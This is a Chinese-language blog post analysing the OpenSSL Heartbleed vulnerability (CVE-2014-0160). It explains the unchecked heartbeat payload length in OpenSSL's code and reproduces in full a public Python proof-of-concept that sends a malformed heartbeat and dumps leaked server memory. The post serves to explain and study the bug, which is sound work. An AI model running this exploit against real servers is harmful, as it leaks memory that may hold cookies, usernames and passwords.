文章参考内容来源：
[乌云-关于OpenSSL心脏出血的分析][1]
[github-py][2] （用来学习）    
[Heartbleed 实战：一个影响无数网站的缓冲区溢出漏洞][3]  
[Openssl 漏洞POC学习][4]


好久不冒泡 =w=， 刚好最近互联网界出了件大事，就是openssl的heartbleed，波及范围之广就不用多说了，反正应该是很多人睡不着觉了。=w=我呢，就对这个事件做一次原理的记录。

我们看heartbleed这个名字，搞过网络编程的同学应该都知道心跳包，很常见，是一种用来检测对端是否还存活的手段，防止大量已死的对端还在占用链接，而ssl也是有heartbeat的，ssl的心跳包协议是这个样子：
心跳包类型，1byte
载荷长度，2byte，
载荷内容，最大为2^14
协议还规定，收到心跳包以后将载荷回显，表示还活着，那么我们看ssl的代码：

        hbtype = *p++;
        n2s(p, payload);
        pl = p;

 这段代码的意思： hbyte首先取得心跳包的类型，n2s这个函数是什么意思呢？是将p指向的两个字节，也就是载荷的长度放入payload变量中，并且将p + 2, 指向载荷。

再来看另一段代码(节选)：  

        if (hbtype == TLS1_HB_REQUEST) {
                unsigned char *buffer, *bp;
                int r;

                buffer = OPENSSL_malloc(1 + 2 + payload + padding);
                bp = buffer;

                *bp++ = TLS1_HB_RESPONSE;
                s2n(payload, bp);
                memcpy(bp, pl, payload);
                bp += payload;
        }

如果发来的包是心跳包，那么首先malloc，这里我们看到是65535 这么多个字节，s2n是什么意思呢？就是将payload也就是长度放入bp中。然后拷贝这么多字节到bp，也就是缓冲区当中。

也就是说，可能payload是虚假的，比如我实际心跳包数据只有一个字节，我写一个65535 -100 的数字到payload中，OpenSSL这里是完全不检查实际长度的。那么将近64kb的内存会被泄漏出来，而且这64kb是pl的，在SSLv3记录的附近，一些cookie, 甚至usrname, password都不能幸免。

那么我们来看python脚本攻击的代码， 代码如下，地址文章的最开始有。

    #!/usr/bin/python
    
    # Quick and dirty demonstration of CVE-2014-0160 by Jared Stafford (jspenguin@jspenguin.org)
    # The author disclaims copyright to this source code.
    
    import sys
    import struct
    import socket
    import time
    import select
    import re
    from optparse import OptionParser
    
    options = OptionParser(usage='%prog server [options]', description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
    options.add_option('-p', '--port', type='int', default=443, help='TCP port to test (default: 443)')
    
    def h2bin(x):
        return x.replace(' ', '').replace('\n', '').decode('hex')
    
    hello = h2bin('''
    16 03 02 00  dc 01 00 00 d8 03 02 53
    43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
    bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
    00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
    00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
    c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
    c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
    c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
    c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
    00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
    03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
    00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
    00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
    00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
    00 0f 00 01 01                                  
    ''')
    
    hb = h2bin(''' 
    18 03 02 00 03
    01 40 00
    ''')
    
    def hexdump(s):
        for b in xrange(0, len(s), 16):
            lin = [c for c in s[b : b + 16]]
            hxdat = ' '.join('%02X' % ord(c) for c in lin)
            pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
            print '  %04x: %-48s %s' % (b, hxdat, pdat)
        print
    
    def recvall(s, length, timeout=5):
        endtime = time.time() + timeout
        rdata = ''
        remain = length
        while remain > 0:
            rtime = endtime - time.time() 
            if rtime < 0:
                return None
            r, w, e = select.select([s], [], [], 5)
            if s in r:
                data = s.recv(remain)
                # EOF?
                if not data:
                    return None
                rdata += data
                remain -= len(data)
        return rdata
            
    
    def recvmsg(s):
        hdr = recvall(s, 5)
        if hdr is None:
            print 'Unexpected EOF receiving record header - server closed connection'
            return None, None, None
        typ, ver, ln = struct.unpack('>BHH', hdr)
        pay = recvall(s, ln, 10)
        if pay is None:
            print 'Unexpected EOF receiving record payload - server closed connection'
            return None, None, None
        print ' ... received message: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
        return typ, ver, pay
    
    def hit_hb(s):
        s.send(hb)
        while True:
            typ, ver, pay = recvmsg(s)
            if typ is None:
                print 'No heartbeat response received, server likely not vulnerable'
                return False
    
            if typ == 24:
                print 'Received heartbeat response:'
                hexdump(pay)
                if len(pay) > 3:
                    print 'WARNING: server returned more data than it should - server is vulnerable!'
                else:
                    print 'Server processed malformed heartbeat, but did not return any extra data.'
                return True
    
            if typ == 21:
                print 'Received alert:'
                hexdump(pay)
                print 'Server returned error, likely not vulnerable'
                return False
    
    def main():
        opts, args = options.parse_args()
        if len(args) < 1:
            options.print_help()
            return
    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print 'Connecting...'
        sys.stdout.flush()
        s.connect((args[0], opts.port))
        print 'Sending Client Hello...'
        sys.stdout.flush()
        s.send(hello)
        print 'Waiting for Server Hello...'
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                print 'Server closed connection without sending Server Hello.'
                return
            # Look for server hello done message.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break
    
        print 'Sending heartbeat request...'
        sys.stdout.flush()
        s.send(hb)
        hit_hb(s)
    
    if __name__ == '__main__':
        main()

重点在与hb这个包，根据协议，第0位是心跳包的类型，1，2是Openssl的版本类型，3， 4是message的长度， 5位是message的类型，6,7是payload length，可以看到没有实际的payload，那么周围的信息全部会被dump出来，这个就是核心的代码。

这次的事件也算给自己以后写代码提个醒 ，不能太过相信用户。嘛。新一轮的改密码风波来了，我总有预感，这事还没结束。 ^ ^

  [1]: http://drops.wooyun.org/papers/1381
  [2]: https://github.com/musalbas/heartbleed-masstest
  [3]: http://elevencitys.com/?p=7254
  [4]: http://blog.csdn.net/youfuchen/article/details/23279547